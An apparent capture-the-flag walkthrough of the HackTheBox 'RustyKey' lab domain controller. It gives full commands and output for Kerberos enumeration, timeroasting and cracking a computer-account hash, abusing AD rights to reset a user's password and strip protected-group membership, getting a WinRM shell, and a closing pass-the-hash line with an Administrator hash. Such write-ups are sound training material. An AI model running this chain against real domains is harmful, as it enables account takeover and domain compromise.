![](https://github.com/user-attachments/assets/5833ffa5-0cbd-4c9f-becf-63aa5ad9ac64)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.75
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 18:10 +08
Warning: 10.10.11.75 giving up on port because retransmission cap hit (10).
Nmap scan report for rustykey.htb (10.10.11.75)
Host is up (0.0062s latency).
Not shown: 45895 closed tcp ports (reset), 19613 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49680/tcp open  unknown
49696/tcp open  unknown
49730/tcp open  unknown
58205/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 5.18 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49680,49696,49730,58205 -sCV 10.10.11.75
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 18:11 +08
Nmap scan report for rustykey.htb (10.10.11.75)
Host is up (0.0062s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-31 10:11:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
58205/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-08-31T10:12:46
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.53 seconds
```

## 2. Exploring Active Directory

### 2.1. Exploring with provided credentials

> **Machine information given:**
>
> As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account:
>
> `rr.parker` / `8#t5HE8L!W3A`

Provided credentials cannot log in directly:

```console
root@kali:~# netexec smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A'
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.75     445    10.10.11.75      [-] 10.10.11.75\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED

root@kali:~# netexec ldap dc.rustykey.htb  -u rr.parker -p '8#t5HE8L!W3A'
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

### 2.2. Attempting Kerberos

Attempting to get TGT resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:

```console
root@kali:~# impacket-getTGT rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip dc.rustykey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Let's sync the time on Kali with the target

Install ntpdate: `apt -y install ntpsec-ntpdate`

Turns out the time on Kali was 27271 seconds behind of the target

```console
root@kali:~# ntpdate -q dc.rustykey.htb
2025-09-07 15:12:12.981306 (+0800) +27271.702652 +/- 0.003064 dc.rustykey.htb 10.10.11.75 s1 no-leap
```

Disable NTP on Kali and sync the time with the target

```console
root@kali:~# timedatectl set-ntp 0

root@kali:~# ntpdate dc.rustykey.htb
2025-09-07 15:13:04.169129 (+0800) +27271.702622 +/- 0.002899 dc.rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 27271.702622

root@kali:~# ntpdate -q dc.rustykey.htb
2025-09-07 15:13:13.411174 (+0800) -0.000026 +/- 0.002820 dc.rustykey.htb 10.10.11.75 s1 no-leap
```

`getTGT` works after the time sync

```console
root@kali:~# impacket-getTGT rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip dc.rustykey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in rr.parker.ccache

root@kali:~# export KRB5CCNAME=rr.parker.ccache
```

## 2.3. Getting some information with rr.parker TGT

Get shares

```console
root@kali:~# netexec smb dc.rustykey.htb -d rustykey.htb -u rr.parker -k --use-kcache --shares
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker from ccache
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share
```

Get users

```console
root@kali:~# netexec ldap dc.rustykey.htb -d rustykey.htb -u rr.parker -k --use-kcache --users
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker from ccache
LDAP        dc.rustykey.htb 389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        dc.rustykey.htb 389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        dc.rustykey.htb 389    DC               Administrator                 2025-06-05 06:52:22 0        Built-in account for administering the computer/domain
LDAP        dc.rustykey.htb 389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        dc.rustykey.htb 389    DC               krbtgt                        2024-12-27 08:53:40 0        Key Distribution Center Service Account
LDAP        dc.rustykey.htb 389    DC               rr.parker                     2025-06-05 06:54:15 0
LDAP        dc.rustykey.htb 389    DC               mm.turner                     2024-12-27 18:18:39 0
LDAP        dc.rustykey.htb 389    DC               bb.morgan                     2025-09-07 15:16:39 0
LDAP        dc.rustykey.htb 389    DC               gg.anderson                   2025-09-07 15:16:39 0
LDAP        dc.rustykey.htb 389    DC               dd.ali                        2025-09-07 15:16:39 0
LDAP        dc.rustykey.htb 389    DC               ee.reed                       2025-09-07 15:16:39 0
LDAP        dc.rustykey.htb 389    DC               nn.marcos                     2024-12-27 19:34:50 0
LDAP        dc.rustykey.htb 389    DC               backupadmin                   2024-12-30 08:30:18 0
```

Get RIDs:

```console
root@kali:~# netexec smb dc.rustykey.htb -d rustykey.htb -u rr.parker -k --use-kcache --rid-brute
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker from ccache
SMB         dc.rustykey.htb 445    dc               498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               500: RUSTYKEY\Administrator (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               501: RUSTYKEY\Guest (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               502: RUSTYKEY\krbtgt (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               512: RUSTYKEY\Domain Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               513: RUSTYKEY\Domain Users (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               514: RUSTYKEY\Domain Guests (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               515: RUSTYKEY\Domain Computers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               516: RUSTYKEY\Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               517: RUSTYKEY\Cert Publishers (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               518: RUSTYKEY\Schema Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               525: RUSTYKEY\Protected Users (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               526: RUSTYKEY\Key Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               1000: RUSTYKEY\DC$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1128: RUSTYKEY\HelpDesk (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1130: RUSTYKEY\Protected Objects (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1131: RUSTYKEY\IT (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1132: RUSTYKEY\Support (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1133: RUSTYKEY\Finance (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1136: RUSTYKEY\DelegationManager (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1137: RUSTYKEY\rr.parker (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1138: RUSTYKEY\mm.turner (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1139: RUSTYKEY\bb.morgan (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1140: RUSTYKEY\gg.anderson (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1143: RUSTYKEY\dd.ali (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1145: RUSTYKEY\ee.reed (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1146: RUSTYKEY\nn.marcos (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (SidTypeUser)
```

### 2.4. Bloodhound with rr.parker TGT

Generating bloodhound packages

```console
root@kali:~# bloodhound-ce-python -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -ns 10.10.11.75 -c all --dns-tcp --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 01S
INFO: Compressing output into 20250907230146_bloodhound.zip
```

This `rr.parker` user isn't really useful:

![](https://github.com/user-attachments/assets/413664ef-49fc-49be-a79f-8a7658eca17b)

But the `mm.turner` user comes up in some shortest path searches, keep this in mind for later:

![](https://github.com/user-attachments/assets/55e61f44-d1c8-49e4-8e21-d3367e2ad312)

![](https://github.com/user-attachments/assets/8892f586-1e8d-4591-b728-b5d31c9e864e)

![](https://github.com/user-attachments/assets/992d3a1d-bf6b-47ad-a265-588cfdeb700c)

## 3. Getting access

### 3.1. Timeroasting

A technique called [timeroasting](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac0) may work here

> Unauthenticated clients can take a list of RIDs and send MS-SNTP requests to a DC to collect MD5 digests calculated with domain computer hashes.
> 
> This makes timeroasting a viable method to identify and crack pre-created machine accounts and other weak computer passwords in a stealthier manner than by using dictionaries or tools like [pre2k](https://github.com/garrettfoster13/pre2k).

Ther are some requirements for timeroasting to work:

1. The target must be a computer account, and cannot be directly targeted at ordinary user accounts (unless "target Timeroasting" modifies the properties).
2. The target domain controller starts and responds to the NTP service with Microsoft SNTP Extended Authentication (MS-SNTP), and UDP port 123 is open.
3. The attacker can send unauthenticated MS-SNTP requests to the DC (no valid credentials are required).
4. The RID (relative identifier) of computer accounts in the domain can be enumerated.
5. (Optional) For "target Timeroasting", domain administrator privileges are required to temporarily modify the user account properties so that it is treated as a computer account.
6. The computer account passwords in the domain are not strongly protected (for example, weak passwords or not changed regularly).

Use the [timeroast.py](https://github.com/SecuraBV/Timeroast) script to dicover hashes:

```console
root@kali:~# curl -sLO https://github.com/SecuraBV/Timeroast/raw/refs/heads/main/timeroast.py

root@kali:~# python timeroast.py 10.10.11.75
1000:$sntp-ms$4b184895bcdac26bd3f6b3a2828053c2$1c0111e900000000000a7e024c4f434cec677c13281ee675e1b8428bffbfcd0aec682232dc582708ec682232dc584a43
1103:$sntp-ms$68afac2200adfe3932ef2cf535128328$1c0111e900000000000a7e024c4f434cec677c13283f1412e1b8428bffbfcd0aec68223374473471ec68223374474d9c
1104:$sntp-ms$8a79f64c17489cfdef6abde741677d05$1c0111e900000000000a7e024c4f434cec677c1329a807f1e1b8428bffbfcd0aec68223375b02348ec68223375b044d6
1105:$sntp-ms$ebfd6adc05f50eb9c4282ecd3b1c4bee$1c0111e900000000000a7e024c4f434cec677c132b01c0cae1b8428bffbfcd0aec6822337709ddcfec6822337709fdaf
1106:$sntp-ms$52b87937859eaa1487344fdab51f8b9a$1c0111e900000000000a7e024c4f434cec677c13283f1c75e1b8428bffbfcd0aec682233785fce9cec682233785feb22
1107:$sntp-ms$ea1eab18ecb64061f9a68e02328857dc$1c0111e900000000000a7e024c4f434cec677c1329a88acee1b8428bffbfcd0aec68223379c93cf5ec68223379c95b28
1118:$sntp-ms$f8c827e647464466b757f683c07bf547$1c0111e900000000000a7e024c4f434cec677c1329e93ef3e1b8428bffbfcd0aec68223389e92fd9ec68223389e94904
1119:$sntp-ms$e95abb61d469e5b222ba9a0b86c51f0a$1c0111e900000000000a7e024c4f434cec677c132b51f9c7e1b8428bffbfcd0aec6822338b51e5a5ec6822338b5203d8
1120:$sntp-ms$6b59da9b61a3fb4a00209a5b29a3f403$1c0111e900000000000a7e024c4f434cec677c132898af8ee1b8428bffbfcd0aec6822338cb12b86ec6822338cb1506f
1121:$sntp-ms$03d52cff33b5b2dadff43f36dce934f0$1c0111e900000000000a7e024c4f434cec677c1329ff822be1b8428bffbfcd0aec6822338e17f91bec6822338e18230c
1122:$sntp-ms$e61ff6e705a5eeda173c1bcdfa79823a$1c0111e900000000000a7e024c4f434cec677c132b60a633e1b8428bffbfcd0aec6822338f79207dec6822338f794566
1123:$sntp-ms$92b3593af0f6100870e32c86ebfe63a2$1c0111e900000000000a7e024c4f434cec677c1328a4ac1ce1b8428bffbfcd0aec68223390d5bb88ec68223390d5e071
1124:$sntp-ms$ad1747f7e239d3b50692b920a23af53c$1c0111e900000000000a7e024c4f434cec677c132a0b8066e1b8428bffbfcd0aec682233923c8e25ec682233923cb161
1125:$sntp-ms$dd16964e6d6f05fda3e825ebf5d1f424$1c0111e900000000000a7e024c4f434cec677c1327c0d979e1b8428bffbfcd0aec68223393c8f82bec68223393c914b1
1126:$sntp-ms$b2a364d005ab94fe19a0c309f650ef86$1c0111e900000000000a7e024c4f434cec677c132905c38ee1b8428bffbfcd0aec682233950ddd38ec682233950e0073
1127:$sntp-ms$51001bfc2f7768ccc4e59c4db49f0830$1c0111e900000000000a7e024c4f434cec677c13291bdcd5e1b8428bffbfcd0aec6822339523f82cec682233952419ba
```

Download and unpack the latest version of hashcat:

```console
root@kali:~# curl -sLO https://github.com/hashcat/hashcat/releases/download/v7.1.2/hashcat-7.1.2.7z

root@kali:~# 7z x hashcat-7.1.2.7z

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_SG.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 19682772 bytes (19 MiB)

Extracting archive: hashcat-7.1.2.7z
--
Path = hashcat-7.1.2.7z
Type = 7z
Physical Size = 19682772
Headers Size = 25149
Method = LZMA2:384m LZMA:20 BCJ2
Solid = +
Blocks = 2

Everything is Ok

Folders: 56
Files: 3100
Size:       389386374
Compressed: 19682772
```

Put the hashes from `timeroast.py` without the `<rid>:` prefix and run hashcat against the hashes with rockyou.txt

```console
root@kali:~/hashcat-7.1.2# ./hashcat.bin -m 31300 ../timeroast-hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
⋮

$sntp-ms$dd16964e6d6f05fda3e825ebf5d1f424$1c0111e900000000000a7e024c4f434cec677c1327c0d979e1b8428bffbfcd0aec68223393c8f82bec68223393c914b1:Rusty88!
Approaching final keyspace - workload adjusted.
⋮
```

Match the cracked hash with the original `timeroast.py` output and the RID is `1125`

Search for RID `1125` in BloodHound:

![](https://github.com/user-attachments/assets/82ffc2d9-d1d1-4c67-af5f-b2ce6e9623a8)

The computer account `IT-COMPUTER3` has `AddSelf` permission to `HELPDESK`:

![](https://github.com/user-attachments/assets/50e6e082-f72e-45ca-bf8f-8db7f18f7bc7)

![](https://github.com/user-attachments/assets/26a6e5e8-b3bd-4dcf-be6f-f9478a2e158a)

`HELPDESK` has outbound control to several objects:

![](https://github.com/user-attachments/assets/22612c40-bece-4446-9b45-f6e0a9fd0ab2)

ForceChangePassword:

![](https://github.com/user-attachments/assets/7ebe2ec6-9d0f-4745-9f8f-03218f959e83)

GenericWrite:

![](https://github.com/user-attachments/assets/475f647e-3604-430f-8f3d-d9a6d350f759)

AddMember:

![](https://github.com/user-attachments/assets/753c1e34-3c8f-476c-8457-46a77eb60e41)

### 3.2. Get TGT for `IT-COMPUTER3`

```console
root@kali:~# impacket-getTGT rustykey.htb/IT-COMPUTER3:'Rusty88!' -dc-ip dc.rustykey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in IT-COMPUTER3.ccache

root@kali:~# export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

### 3.3. Add `IT-COMPUTER3` to `HELPDESK` group

> [!Tip]
>
> bloodyAD is used to perform specific LDAP calls to a domain controller for AD privesc
> 
> It supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc
>
> Install bloodyAD in Kali with `apt -y install bloodyad`

```console
root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```

### 3.4. Getting access to `bb.morgan`

Using `ForceChangePassword` permission to reset password for `bb.morgan`:

```console
root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan Pass1234
[+] Password changed successfully!
```

Getting TGT as `bb.morgan` fails:

```console
root@kali:~# impacket-getTGT rustykey.htb/bb.morgan:Pass1234 -dc-ip dc.rustykey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

That's because `bb.morgan` is a member of `IT` group, which is a member of `PROTECTED OBJECTS` group:

![](https://github.com/user-attachments/assets/c1a7443e-8fe0-48c7-8993-3c3d2f6df0fa)

Let's remove both `SUPPORT` and `IT` groups from `PROTECTED OBJECTS` group:

```console
root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' IT
[-] IT removed from PROTECTED OBJECTS

root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' SUPPORT
[-] SUPPORT removed from PROTECTED OBJECTS
```

Getting TGT for `bb.morgan` works:

```console
root@kali:~# impacket-getTGT rustykey.htb/bb.morgan:Pass1234 -dc-ip dc.rustykey.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in bb.morgan.ccache

root@kali:~# export KRB5CCNAME=bb.morgan.ccache
```

Kerberos config file is required to use `evil-winrm` to connect to target using TGT

Create `/etc/krb5.conf` to point to `dc.rustykey.htb` as KDC:

```console
cat << EOF > /etc/krb5.conf
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }
[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
EOF
```

Connect to target as `bb.morgan` and get user flag:

```console
root@kali:~# evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: User is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> type ..\Desktop\user.txt
c089bcf4eb71d15e482fc826d35ff99a
```

## work-in-progress

```
impacket-getTGT rustykey.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26
export KRB5CCNAME='Administrator.ccache'
evil-winrm -i dc.rustykey.htb -r rustykey.htb
```
